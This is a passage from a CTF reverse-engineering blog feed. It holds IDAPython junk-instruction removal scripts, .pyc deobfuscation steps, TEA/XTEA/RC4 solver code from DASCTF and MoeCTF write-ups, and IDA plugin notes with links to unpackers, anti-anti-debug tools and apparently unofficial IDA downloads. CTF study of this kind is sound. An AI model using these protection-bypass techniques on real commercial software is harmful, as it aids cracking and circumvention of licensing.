class="hljs-keyword">def</span> <span class="hljs-title function_">patch</span>(<span class="hljs-params">ea,num=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):<br>        ida_bytes.patch_byte(ea+i,<span class="hljs-number">0x90</span>)<br>    <span class="hljs-keyword">return</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">begin_addr,end_addr,hexStr</span>)<br>  xx=(<span class="hljs-built_in">len</span>(hexStr)-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><br>    bMask = <span class="hljs-built_in">bytes</span>.fromhex(hexStr.replace(<span class="hljs-string">&#x27;00&#x27;</span>, <span class="hljs-string">&#x27;01&#x27;</span>).replace(<span class="hljs-string">&#x27;??&#x27;</span>, <span class="hljs-string">&#x27;00&#x27;</span>))<br>    bPattern = <span class="hljs-built_in">bytes</span>.fromhex(hexStr.replace(<span class="hljs-string">&#x27;??&#x27;</span>, <span class="hljs-string">&#x27;00&#x27;</span>))<br>    signs=ida_bytes.BIN_SEARCH_FORWARD| ida_bytes.BIN_SEARCH_NOBREAK| ida_bytes.BIN_SEARCH_NOSHOW<br>    <span class="hljs-keyword">while</span> begin_addr&lt;end_addr:<br>        ea=ida_bytes.bin_search(begin_addr,end_addr,bPattern,bMask,<span class="hljs-number">1</span>,signs)<br>        <span class="hljs-keyword">if</span> ea == ida_idaapi.BADADDR:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>: <br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea))<br>            patch(ea,xx)<br>            begin_addr=ea+xx <br>f(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-string">&quot;?? ?? 00 00 00 ??&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1721562043136-2bd5e634-32dd-4a02-a83a-f8e6e7115c7e-173184166708853.png" class="" title="img"><p>分析main()函数可以看到是杂乱的字节，观察0x1144可以发现，存在着jmp db1这种类型的花指令，因此可以写一个idapython脚本来解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ida_bytes<br><span class="hljs-keyword">import</span> ida_ida<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch</span>(<span class="hljs-params">ea,num=<span class="hljs-number">1</span></span>):<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):<br>    ida_bytes.patch_byte(ea+i,<span class="hljs-number">0x90</span>)<br>  <span class="hljs-keyword">return</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----&quot;</span>)<br>hexStr=<span class="hljs-string">&quot;EB FF C0 BF ?? 00 00 00 E8&quot;</span><br>bMask = <span class="hljs-built_in">bytes</span>.fromhex(hexStr.replace(<span class="hljs-string">&#x27;00&#x27;</span>, <span class="hljs-string">&#x27;01&#x27;</span>).replace(<span class="hljs-string">&#x27;??&#x27;</span>, <span class="hljs-string">&#x27;00&#x27;</span>))<br>bPattern = <span class="hljs-built_in">bytes</span>.fromhex(hexStr.replace(<span class="hljs-string">&#x27;??&#x27;</span>, <span class="hljs-string">&#x27;00&#x27;</span>))<br>signs=ida_bytes.BIN_SEARCH_FORWARD| ida_bytes.BIN_SEARCH_NOBREAK| ida_bytes.BIN_SEARCH_NOSHOW<br><span class="hljs-built_in">print</span>(bMask,bPattern)<br>begin_addr=<span class="hljs-number">0x1135</span><br>end_addr=<span class="hljs-number">0x3100</span><br><span class="hljs-keyword">while</span> begin_addr&lt;end_addr:<br>  ea=ida_bytes.bin_search(begin_addr,end_addr,bPattern,bMask,<span class="hljs-number">1</span>,signs)<br>  <span class="hljs-keyword">if</span> ea == ida_idaapi.BADADDR:<br>    <span class="hljs-keyword">break</span><br>  <span class="hljs-keyword">else</span>: <br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea))<br>    patch(ea,<span class="hljs-number">3</span>)<br>    begin_addr=ea+<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><h3 id="pyc去花指令"><a href="#pyc去花指令" class="headerlink" title="pyc去花指令"></a>pyc去花指令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">脚本读取机器码<span class="hljs-string">+010</span>删掉花指令+修改co_code长度<br></code></pre></td></tr></table></figure><p>花指令通常开头是JUMP_ABSOLUTE X，然后填充错误代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> marshal, dis<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\\new\\AD\\game\\vnctf2022\\re\\BabyMaze.pyc&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>code = marshal.loads(f[<span class="hljs-number">16</span>:]) <span class="hljs-comment">#这边从16位开始取因为是python3 python2从8位开始取</span><br>dis.dis(code)<br>dis.dis(code)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(code.co_code))<br></code></pre></td></tr></table></figure><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1700738761596-0e59581e-b49e-4165-82c2-582914cabe90-173184166708855.png" class="" title="img"><p>转为十六进制后去010editor修改，去掉即可，这里JUMP_ABSOLUTE16进制为71</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1700738995690-98510c80-1424-448e-b824-e2a26248c12f-173184166708857.png" class="" title="img"><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1700739054715-46fb1e74-1aa1-4380-a6d4-75db5236e992-173184166708859.png" class="" title="img"><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1700739191513-de253465-6cc9-4a7a-b634-9d64e2a4f19a-173184166708861.png" class="" title="img"><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1700739265623-36862cfa-dd7f-487e-8619-d168e782330b-173184166708863.png" class="" title="img"><p>之后重新反编译即可</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF2024.10部分Reverse</title>
    <link href="/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/"/>
    <url>/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/</url>
    
    <content type="html"><![CDATA[<p><strong>ezre</strong></p><p>14解</p><p>看上去有壳，但是无法手动脱</p><img src="/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/1729308978432-b0dd664d-b08b-44d4-9f5a-c66b0e1fc67c.png" class="" title="img"><p>不能sfx脱壳，也不能动调</p><img src="/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/1729308926396-23de3e88-a3b4-4e4f-be89-cee838b32710.png" class="" title="img"><p>搜保护器的名字，找到unpack工具<a href="https://github.com/ergrelet/unlicense">Releases · ergrelet&#x2F;unlicense (github.com)</a></p><p>去花指令后得到main是rc4魔改+tea魔改</p><img src="/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/1729340053117-1a162c50-efe7-49c5-a0c8-b975e206541a.png" class="" title="img"><p>tea一次移一个字符，36次循环刚好移完全部密文</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">0x9E3779B8</span>, sum = <span class="hljs-number">0x66778899</span>+delta * (<span class="hljs-number">33</span>);<br>    <span class="hljs-comment">//printf(&quot;%x,%x,&quot;,v0,v1);</span><br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum -= delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">5</span>) ^ (v1 &gt;&gt; <span class="hljs-number">6</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>    <span class="hljs-comment">//printf(&quot;%x,%x,&quot;,v0,v1);</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x6E982837</span>,<span class="hljs-number">0x44332211</span>,<span class="hljs-number">0x11223344</span>,<span class="hljs-number">0x3728986E</span>&#125;;<br>    <span class="hljs-type">char</span> enc[] = &#123;<span class="hljs-number">0x50</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x81</span>,<br>                  <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x5D</span>,<br>                  <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x80</span>,<br>                  <span class="hljs-number">0x81</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xE2</span>,<br>                  <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xD8</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">36</span>; i&gt;=<span class="hljs-number">0</span>; i-=<span class="hljs-number">1</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">44</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x,&quot;</span>, enc[i]&amp;<span class="hljs-number">0xff</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>rc4的魔改</p><img src="/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/1729340154073-a6075c82-2bb0-44bd-85d5-9fa7896da708.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append((char - (S[(S[i] + S[j]) % <span class="hljs-number">256</span>]^<span class="hljs-number">0x33</span>))%<span class="hljs-number">256</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0xf5</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xc9</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0xd6</span>,<span class="hljs-number">0xe3</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0xe9</span>,<span class="hljs-number">0xf6</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0xde</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0xc5</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0xac</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0xb6</span>,<span class="hljs-number">0xa4</span>,<span class="hljs-number">0xe</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0xa2</span>,<span class="hljs-number">0xaf</span>,<span class="hljs-number">0x45</span>])<br>key = <span class="hljs-string">b&#x27;th0s_i0_ke9&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tea魔改</tag>
      
      <tag>rc4魔改</tag>
      
      <tag>脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA相关</title>
    <link href="/2024/10/16/IDA%E7%9B%B8%E5%85%B3/"/>
    <url>/2024/10/16/IDA%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>注意不要有中文路径</p><p>下面是7.7的全插件版，好像要从阿里网盘下</p><p><a href="https://bbs.kanxue.com/thread-276531.htm">https://bbs.kanxue.com/thread-276531.htm</a></p><p>吾爱破解上的8.3</p><p><a href="https://down.52pojie.cn/Tools/Disassemblers/">https://down.52pojie.cn/Tools/Disassemblers/</a></p><h1 id="一些操作"><a href="#一些操作" class="headerlink" title="一些操作"></a>一些操作</h1><img src="/2024/10/16/IDA%E7%9B%B8%E5%85%B3/1723449748297-a4487684-a910-40c3-8de7-7922c1b5b5b9.png" class="" title="img"><h1 id="插件简单说明"><a href="#插件简单说明" class="headerlink" title="插件简单说明"></a>插件简单说明</h1><h2 id="findcrypt3"><a href="#findcrypt3" class="headerlink" title="findcrypt3"></a>findcrypt3</h2><p>用idapyswitch选择有yara-python的py版本，把findcrypt3.py和findcrypt3.rules放到plugins目录</p><h2 id="IDARustDemanager"><a href="#IDARustDemanager" class="headerlink" title="IDARustDemanager"></a>IDARustDemanager</h2><p><a href="https://www.yuque.com/u34082223/swqzq3/asyrepf22ypc4ddp">https://www.yuque.com/u34082223/swqzq3/asyrepf22ypc4ddp</a></p><h2 id="d810"><a href="#d810" class="headerlink" title="d810"></a>d810</h2><p>要用python3.7,7.7可行</p><h2 id="易语言"><a href="#易语言" class="headerlink" title="易语言"></a>易语言</h2><p>[<a href="https://bbs.kanxue.com/thread-274271.htm">原创]IDA易语言反编译插件E-Decompiler-IDA Pro插件区-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://github.com/fjqisba/E-Decompiler?tab=readme-ov-file">https://github.com/fjqisba/E-Decompiler?tab=readme-ov-file</a></p><p>有编译好的文件在releases，按教程来就行,下面是7.7的patch，目前就7.7完全适配,8.3还是无法显示中文</p><p><a href="https://www.yuque.com/attachments/yuque/0/2024/zip/35612767/1727525756484-a7488b0f-95fb-4d72-94cc-37d90ae6bd6d.zip">📎ida7.7_patch.zip</a></p><img src="/2024/10/16/IDA%E7%9B%B8%E5%85%B3/1713267818879-98476862-c91c-4ec2-8834-3e6597a91fe8.png" class="" title="img"><h2 id="idagolanghelper"><a href="#idagolanghelper" class="headerlink" title="idagolanghelper"></a>idagolanghelper</h2><p>帮助恢复go语言的符号表，8.3好像默认会自动恢复符号表</p><p><a href="https://github.com/renshareck/IDAGolangHelper_SupportGo1.20">https://github.com/renshareck/IDAGolangHelper_SupportGo1.20</a></p><h2 id="Scylla"><a href="#Scylla" class="headerlink" title="Scylla"></a>Scylla</h2><p>8.3的ida也能用,下面的目前是能用的，7.7自带但是无法正常使用</p><p><a href="https://github.com/notify-bibi/ScyllaHide-IDA7.5">notify-bibi&#x2F;ScyllaHide-IDA7.5: ScyllaHide for IDA7.5; ScyllaHide IDA7.5; It is a really niccccccce anti-anti-debug tool (github.com)</a></p><p>选择ScyllaHide</p><img src="/2024/10/16/IDA%E7%9B%B8%E5%85%B3/1723448650692-68717c3d-d8c6-4cb7-997c-92604e1d0932.png" class="" title="img"><p>去反调试设置</p><img src="/2024/10/16/IDA%E7%9B%B8%E5%85%B3/1723448674509-2126c472-a0d5-4f9a-9976-41a4e4a34730.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MoeCTF2024部分Re与Pwn</title>
    <link href="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/"/>
    <url>/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="入门指北"><a href="#入门指北" class="headerlink" title="入门指北"></a>入门指北</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723263301340-fcca3831-c2da-4c5f-a04d-842ce835c2c3.png" class="" title="img"><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273162689-e73d74b2-e945-4f1a-9f31-70d830aec1db.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273152970-ffbb12bc-03ee-457d-a9d5-0545bf3edf76.png" class="" title="img"><h2 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886477905-248a3059-0117-45dc-85fe-c0ad57fe3003.png" class="" title="img"><h2 id="dynamic"><a href="#dynamic" class="headerlink" title="dynamic"></a>dynamic</h2><p>第一个函数就是加密函数</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886744368-63b88a1c-b933-44f2-82e9-47dc1ba38adb.png" class="" title="img"><p>xxtea</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886633287-b0a152ab-b531-4533-b4b0-34e30e17de92.png" class="" title="img"><p>在最后result下断点，然后去看a1数组</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886715827-80f46a61-4abb-437f-8efe-43823463a476.png" class="" title="img"><h2 id="upx-revenge"><a href="#upx-revenge" class="headerlink" title="upx_revenge"></a>upx_revenge</h2><p>修改特征码vmp为UPX</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886953397-6e5e2571-8407-4c99-8393-ddfa328d772f.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723887048654-5d7ee7a7-75ff-497b-bb19-0967ca86c63e.png" class="" title="img"><h2 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h2><p>这题由于密文只有三组，中间一组会经过两次解密</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724069557932-4f6bf624-f24d-48c2-ba82-e0e3e582318a.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">855655493</span>, sum = delta * (<span class="hljs-number">-32</span>);<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-comment">//uint32_t enc[] = &#123;0xA3, 0x69, 0x96, 0x26, 0xBD, 0x78, 0x0B, 0x3D, 0x9D, 0xA5, 0x28, 0x62&#125;;</span><br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">0x269669a3</span>, <span class="hljs-number">0x3d0b78bd</span>, <span class="hljs-number">0x6228a59d</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>; i&gt;=<span class="hljs-number">0</span>; i-=<span class="hljs-number">1</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//moectf2024!!</span><br></code></pre></td></tr></table></figure><h2 id="d0tN3t"><a href="#d0tN3t" class="headerlink" title="d0tN3t"></a>d0tN3t</h2><p>dnspy打开找到main</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724070504922-2f26684c-27cd-46cf-b0bb-34818b25de07.png" class="" title="img"><p>有部分不可见字符记得这样处理</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724070539054-06914e00-9eae-4a64-a78c-c3cbe94b80f7.png" class="" title="img"><h2 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h2><p>两位一组是密文</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134162023-5d4880da-855e-43ea-a0b3-e897d861cf92.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span 